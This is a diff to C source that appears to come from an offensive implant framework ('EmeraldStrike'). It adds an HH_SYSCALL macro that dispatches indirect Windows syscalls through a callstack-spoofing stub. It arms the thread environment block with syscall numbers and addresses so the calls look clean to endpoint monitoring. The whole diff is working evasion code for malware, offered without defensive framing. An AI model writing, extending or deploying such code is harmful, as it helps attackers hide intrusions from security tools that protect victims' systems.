@@ -94,6 +94,41 @@ static inline void _hh_write_teb(void* p) {
     );
 }
 
+// ── HH_SYSCALL macro: when callstack spoofing is enabled AND initialized,
+// route through desync_spoof_call for clean callstack. Otherwise direct dispatch. ──
+
+#if defined(INCLUDE_EVASION_CALLSTACK_SPOOF) && (CALLSTACK_SPOOF_MODE != SPOOF_NONE)
+
+// Helper: prepare HH_GATE in TEB, then route via spoofed call stub
+// The spoofed call target is HH_RunSyscall (indirect syscall stub).
+// We arm the TEB with the gate, then call through the spoofer which
+// will JMP to HH_RunSyscall with a fake callstack.
+#define HH_SYSCALL(ntSys, ...) ({                                               \
+    HH_GATE _hh_gate;                                                           \
+    _hh_gate.SSn = (ntSys).dwSSn;                                              \
+    _hh_gate._pad = 0;                                                          \
+    _hh_gate.SyscallAddr = (ntSys).pSyscallInstAddress;                         \
+    void* _hh_old_teb = _hh_read_teb();                                         \
+    _hh_write_teb((void*)&_hh_gate);                                            \
+    PINSTANCE _hh_inst = EMERALDSTRIKE_INSTANCE;                                \
+    NTSTATUS _hh_r;                                                              \
+    if (_hh_inst->bCallstackSpoofInit) {                                        \
+        _hh_r = (NTSTATUS)(UINT64)callstack_spoofed_call(                       \
+            _hh_inst, (PVOID)(void*)HH_RunSyscall,                              \
+            _hh_count_args(__VA_ARGS__), ##__VA_ARGS__);                        \
+    } else {                                                                     \
+        _hh_r = ((NTSTATUS(NTAPI*)(...))((void*)HH_RunSyscall))(__VA_ARGS__);  \
+    }                                                                            \
+    _hh_write_teb(_hh_old_teb);                                                 \
+    _hh_r;                                                                       \
+})
+
+// Argument counter for up to 11 args
+#define _hh_count_args_impl(_1,_2,_3,_4,_5,_6,_7,_8,_9,_10,_11,N,...) N
+#define _hh_count_args(...) _hh_count_args_impl(__VA_ARGS__,11,10,9,8,7,6,5,4,3,2,1,0)
+
+#else // No callstack spoofing - direct dispatch (original behavior)
+
 #define HH_SYSCALL(ntSys, ...) ({                                               \
     HH_GATE _hh_gate;                                                           \
     _hh_gate.SSn = (ntSys).dwSSn;                                              \
@@ -105,6 +140,8 @@ static inline void _hh_write_teb(void* p) {
     _hh_write_teb(_hh_old_teb);                                                 \
     _hh_r;                                                                       \
 })
+
+#endif // INCLUDE_EVASION_CALLSTACK_SPOOF
 
 // ════════════════════════════════════════════════════════════════════════
 //  x86
